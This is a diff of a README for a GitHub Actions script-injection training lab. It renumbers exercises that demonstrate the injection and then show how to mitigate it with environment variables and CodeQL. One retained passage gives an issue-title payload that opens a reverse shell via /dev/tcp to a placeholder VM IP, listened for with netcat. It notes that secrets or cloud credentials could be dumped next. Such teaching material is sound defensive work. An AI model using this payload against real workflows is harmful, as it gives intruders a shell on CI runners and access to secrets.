@@ -22,13 +22,11 @@ Let's create a new issue with this title and see what happens. We observe that t
 
 Ok. Big deal. So we were able to see what is in the workspace directory. Who cares?  
 Now let's try something a little more sinister...
-
-## Exercise 2 - Getting a shell on the runner
 Spin up a linux vm in the cloud that has a public IP address. Login and run `nc -nvlp 1337`. Then open a new issue with the title `octocat"; bash -i >& /dev/tcp/<YOUR-VM-IP-ADDRESS>/1337 0>&1 ; ls -l $GITHUB_WORKSPACE"`  
 
 Now I have a shell on the runner! This is a great "foot in the door" from which I can attemp other exploits, like dumping secrets or cloud credentials to use in other attacks.  
 
-## Exercise 3 - Script injection in github-script action
+## Exercise 2 - Script injection in github-script action
 The [Check issue comment](.github/workflows/check-issue-comment.yml) workflow uses issue comment body in the [github-script actions](https://github.com/actions/github-script) as follows:
 ```
 const comment="${{ github.event.comment.body }}"
@@ -42,7 +40,7 @@ Let's create a new issue comment with this body and see what happens. We observe
 
 <img width="1034" alt="Screenshot 2023-08-30 at 9 07 51 PM" src="https://github.com/robandpdx/workflow-script-injection/assets/95243761/8730dc36-b596-4766-b24a-ec85209a6763">
 
-## Exercise 4 - Mitigate script injection in the run command
+## Exercise 3 - Mitigate script injection in the run command
 To mitigate the script injection issue in the [Check issue title](.github/workflows/check-issue-title.yml) workflow that we saw in exercise 1, we need to do the following:
 1. Remove `${{ github.event.issue.title }}` from the run command 
 2. Set and environment variable to the value `${{ github.event.issue.title }}`
@@ -69,7 +67,7 @@ Now let's create a new issue with the title we used to exploit the script inject
 
 We find that the workflow does not execute the `ls -l $GITHUB_WORKSPACE` command. Success!
 
-## Exercise 5 - Migrate script injection in github-script action
+## Exercise 4 - Migrate script injection in github-script action
 To mitigate the script injection issue in the [Check issue comment](.github/workflows/check-issue-comment.yml) workflow, we need to do the following:
 1. Remove `${{ github.event.issue.title }}` from our github-script action usage
 2. Set and environment variable to the value `${{ github.event.issue.title }}`
@@ -98,7 +96,7 @@ Now let's create a new issue comment with the contents we used to exploit the sc
 
 We find that the workflow does not execute the `console.log('WTF!!!');` code. Success!
 
-## Exercise 6 - Mitigate using GitHub Action
+## Exercise 5 - Mitigate using CodeQL Action Workflow
 ### Creating an Actions workflow to scan Workflow files using CodeQL
 In this section we are going to create an Actions workflow to scan existing workflows for any security weaknesses.
 
